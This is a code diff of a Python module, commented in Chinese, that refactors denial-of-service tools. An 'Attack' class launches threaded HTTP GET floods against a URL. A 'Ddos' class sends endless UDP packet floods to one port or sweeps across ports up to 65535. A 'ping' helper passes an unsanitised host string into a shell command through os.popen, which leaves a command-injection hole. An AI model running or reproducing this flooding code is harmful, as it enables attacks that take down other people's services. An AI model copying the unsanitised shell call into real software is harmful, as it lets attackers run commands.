@@ -7,12 +7,12 @@ headers = {
 #本机信息
 from .hostinfo import Hostinfo
 
-# ping
-def ping(host):
+def ping(host:str) -> str:
+    """ping"""
     return os.popen("ping "+ host).read()
 
-# 获取ip
-def getip(name):
+def getip(name:str):
+    """通过`域名`获取`ip`"""
     try:
         return socket.gethostbyname(name)
     except:
@@ -20,9 +20,9 @@ def getip(name):
 
 
 
-# 洪水攻击
 class Attack:
-    def attack(self):
+    """洪水攻击"""
+    def _attack(self):
         for i in range(self.speed):
             try:
                 r = requests.get(self.url, self.headers)
@@ -31,17 +31,19 @@ class Attack:
                 # 发送失败
                 self.collector['err'] += self.speed - i
                 break
-    def attackRun(self):
+    def _attackRun(self):
         while self.start:
-            t = threading.Thread(target=self.attack, args=())
+            t = threading.Thread(target=self._attack, args=())
             t.start()
     def run(self):
+        """开始攻击"""
         self.start = True
-        t = threading.Thread(target=self.attackRun, args=())
+        t = threading.Thread(target=self._attackRun, args=())
         t.start()
     def stop(self):
+        """停止攻击"""
         self.start = False
-    def __init__(self, url, speed, headers=headers):
+    def __init__(self, url:str, speed:int, headers=headers):
         self.url = url
         self.speed = speed
         self.headers = headers
@@ -52,8 +54,9 @@ class Attack:
 
 
 class Ddos:
-    # 泛洪攻击
-    def allRun(self):
+    """攻击"""
+    def _allRun(self):
+        """泛洪攻击"""
         self.data['port'] = self.port
         while self.start:
             if self.data['port'] > 65535:
@@ -62,23 +65,25 @@ class Ddos:
             self.data['sent'] += 1
             self.data['port'] += 1
     def all(self):
+        """启动泛洪攻击"""
         self.start = True
-        t = threading.Thread(target=self.allRun, args=())
+        t = threading.Thread(target=self._allRun, args=())
         t.start()
-    # 洪攻击
-    def oneRun(self):
+    def _oneRun(self):
+        """洪攻击"""
         self.rport = self.port
         while self.start:
             self.sock.sendto(self.bytes, (self.ip,self.port))
             self.data['sent'] += 1
     def one(self):
+        """启动洪攻击"""
         self.start = True
-        t = threading.Thread(target=self.oneRun, args=())
+        t = threading.Thread(target=self._oneRun, args=())
         t.start()
-    # 停止攻击
     def stop(self):
+        """停止攻击"""
         self.start = False
-    def __init__(self, ip, port = 1):
+    def __init__(self, ip:str, port:int = 1):
         self.sent = 0
         self.ip = ip
         self.port = port
